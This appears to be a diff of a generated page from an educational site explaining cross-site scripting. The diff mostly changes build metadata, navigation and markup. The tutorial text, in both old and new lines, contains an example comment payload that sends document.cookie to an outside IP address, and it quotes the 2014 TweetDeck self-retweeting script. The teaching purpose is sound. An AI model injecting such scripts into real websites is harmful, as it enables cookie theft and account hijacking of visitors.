@@ -5,7 +5,7 @@
 
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="generator" content="MarkBind 2.11.0">
+  <meta name="generator" content="MarkBind 2.12.0">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>SE-EDU/LearningResources - Cross Site Scripting</title>
   <link rel="stylesheet" href="../../../markbind/css/bootstrap.min.css">
@@ -113,7 +113,16 @@
                   </ul>
                 </div>
               </li>
-              <li class="mt-2"><a href="/learningresources/contents/python/introduction-to-python.html" class="site-nav__a">Python</a></li>
+              <li class="mt-2"><button class="dropdown-btn">Python
+ <i class="dropdown-btn-icon">
+<span class="glyphicon glyphicon-menu-down" aria-hidden="true"></span></i></button>
+                <div class="dropdown-container">
+                  <ul class="pl-3 site-nav-list">
+                    <li class="mt-2"><a href="/learningresources/contents/python/introduction-to-python.html" class="site-nav__a">Introduction to Python</a></li>
+                    <li class="mt-2"><a href="/learningresources/contents/python/numpy.html" class="site-nav__a">NumPy</a></li>
+                  </ul>
+                </div>
+              </li>
               <li class="mt-2"><a href="/learningresources/contents/ruby/Ruby.html" class="site-nav__a">Ruby</a></li>
               <li class="mt-2"><a href="/learningresources/contents/rust/Rust.html" class="site-nav__a">Rust</a></li>
               <li class="mt-2"><a href="/learningresources/contents/scala/Scala.html" class="site-nav__a">Scala</a></li>
@@ -318,25 +327,23 @@
           </blockquote>
           <p>However, are users limited to just typing in text? This website does not check the input, thus users are able to use formatting HTML tags, such as <code>&lt;b&gt;</code> for bolding and <code>&lt;i&gt;</code> for italicizing.</p>
           <p>What happens when a user submits the following as a comment?</p>
-          <pre><code class="hljs html">I <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>like<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> your photograph!
-</code></pre>
+          <pre><code class="hljs html"><span>I <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>like<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> your photograph!</span></code></pre>
           <p>It becomes:</p>
           <blockquote>
             <p><strong>Comments Section</strong> <br> That's a very nice picture! <br> Good photograph! <br> I <strong>like</strong> your photograph!</p>
           </blockquote>
-          <p>HTML also supports
-            <tooltip><template slot="_content">In HTML, anything between the opening and closing script tags will run as <b>JavaScript</b>.
-</template><code>&lt;script&gt;</code></tooltip>, for you to write <code>JavaScript</code> code on the webpage as well.</p>
+          <p>HTML also supports <span data-mb-component-type="tooltip" v-b-tooltip.hover.top.html="tooltipInnerContentGetter" class="trigger"><span data-mb-html-for="_content">In HTML, anything between the opening and closing script tags will run as <b>JavaScript</b>.
+</span><code>&lt;script&gt;</code></span>, for you to write <code>JavaScript</code> code on the webpage as well.</p>
           <p>What happens when a malicious user submits the following as a comment?</p>
-          <pre><code class="hljs html">This is an innocent looking comment. <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">sendToServer(<span class="hljs-string">"http://139.241.0.3/"</span>, <span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
-</code></pre>
+          <pre><code class="hljs html"><span>This is an innocent looking comment. <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">sendToServer(<span class="hljs-string">"http://139.241.0.3/"</span>, <span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre>
           <p>It becomes:</p>
           <blockquote>
             <p><strong>Comments Section</strong> <br> That's a very nice picture! <br> Good photograph! <br> I <strong>like</strong> your photograph! <br> This is an innocent looking comment.</p>
           </blockquote>
           <p>Visitors of the blog will only see the non-script portion of the comment. The script portion is rendered as <code>Javascript</code> just like how the <code>&lt;b&gt;</code> and <code>&lt;i&gt;</code> tags causes text to be <strong>bolded</strong>            and <em>italicised</em> but the tags themselves are not shown.</p>
-          <p>The script <code>&lt;script&gt;sendToServer(&quot;http://139.241.0.3/&quot;, document.cookie)&lt;/script&gt;</code> will be run immediately when the visitors load the website. Here, the visitor will be unaware that his
-            <tooltip><template slot="_content">A cookie is a piece of data sent from the server and stored on the client's computer. It can contain sensitive information such as login data.</template>cookie</tooltip> is stolen.</p>
+          <p>The script <code>&lt;script&gt;sendToServer(&quot;http://139.241.0.3/&quot;, document.cookie)&lt;/script&gt;</code> will be run immediately when the visitors load the website. Here, the visitor will be unaware that his <span data-mb-component-type="tooltip"
+              v-b-tooltip.hover.top.html="tooltipInnerContentGetter" class="trigger"><span data-mb-html-for="_content">A cookie is a piece of data sent from the server and stored on the client's computer. It can contain sensitive information such as login data.</span>cookie</span>
+            is stolen.</p>
           <p>Therefore, the malicious user has managed to add additional &quot;functionalities&quot; to the website that is not intended by the original website developer.</p>
           <p>
             <box> Trivia: The term &quot;Cross Site Scripting&quot; is actually an old term. It originally describe an attack whereby hackers write malicious JavaScript scripts on a separate website, and injects it into the victim's website, in order to steal
@@ -370,12 +377,7 @@
           <p><strong>Self-Retweeting Tweet</strong></p>
           <p>In 2014, a tweet became the world's first retweeting tweet. Twitter itself has security measures against XSS and is thus unaffected. However, users on TweetDeck (Twitter social media dashboard application) that came across this tweet will automatically
             retweet this tweet:</p>
-          <pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"xss"</span>&gt;</span><span class="javascript">
-$(<span class="hljs-string">'.xss'</span>).parents().eq(<span class="hljs-number">1</span>).find(<span class="hljs-string">'a'</span>).eq(<span class="hljs-number">1</span>).click();
-$(<span class="hljs-string">'[data-action=retweet]'</span>).click();
-alert(<span class="hljs-string">'XSS in Tweetdeck'</span>)
-</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> ♥
-</code></pre>
+          <pre><code class="hljs html"><span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"xss"</span>&gt;</span></span><span><span class="javascript">$(<span class="hljs-string">'.xss'</span>).parents().eq(<span class="hljs-number">1</span>).find(<span class="hljs-string">'a'</span>).eq(<span class="hljs-number">1</span>).click();</span></span><span><span class="javascript">$(<span class="hljs-string">'[data-action=retweet]'</span>).click();</span></span><span><span class="actionscript">alert(<span class="hljs-string">'XSS in Tweetdeck'</span>)</span></span><span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> ♥</span></code></pre>
           <p>The first line selects the retweet button and then clicks it, and the second line confirms the action by clicking ok on the modal tht confirms the retweet. A TweetDeck user who saw this tweet will only see &quot;♥&quot;, the script portion is
             executed by the browser on the script. Without <code>alert()</code>, the TweetDeck user will not even notice anything.</p>
           <p>You can still see this tweet <a href="https://twitter.com/dergeruhn/status/476764918763749376?lang=en" target="_blank">here</a>.</p>
@@ -456,7 +458,7 @@ alert(<span class="hljs-string">'XSS in Tweetdeck'</span>)
     </div>
     <footer>
       <div class="text-center">
-        <small>[Generated by <a href="https://markbind.org/">MarkBind 2.11.0</a> on Fri, 06 Mar 2020 10:32:33 GMT]</small></div>
+        <small>[Generated by <a href="https://markbind.org/">MarkBind 2.12.0</a> on Mon, Mar 16, 2020, 12:11:08 PM UTC]</small></div>
     </footer>
   </div>
 </body>
